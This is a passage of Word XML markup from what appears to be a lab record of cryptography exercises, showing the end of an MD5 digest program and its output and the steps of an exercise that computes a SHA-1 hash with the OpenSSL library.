          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>case of M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>5 */</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>for(i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>= 0;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt; ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i+</w:t>
      </w:r>
      <w:r>
        <w:t>+) pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("%02x", ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</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b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId29">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rPr>
        <w:t>md5f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>.c -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ssl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rypto</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4715"/>
      </w:pPr>
      <w:hyperlink r:id="rId3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 xml:space="preserve">a.out REC </w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>s:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d6d269952320c4fb5e50f27</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:t>c94a098c</w:t>
      </w:r>
      <w:hyperlink r:id="rId31">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sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1340" w:right="124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522" w:right="715" w:hanging="4422"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 10                                                                                                           </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ate: S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A-1</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S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">A-1 hash </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>chn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>que</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>sl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>brary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n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t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nput</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>2. Ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ck </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ber</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s not</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>equal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o 2. If so pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>error and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>3. Genera</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>hash s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gv[1] by pass</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o sha1 func</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>4.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ored </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">oop </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">hrough </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and put</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o buf var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>6. Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
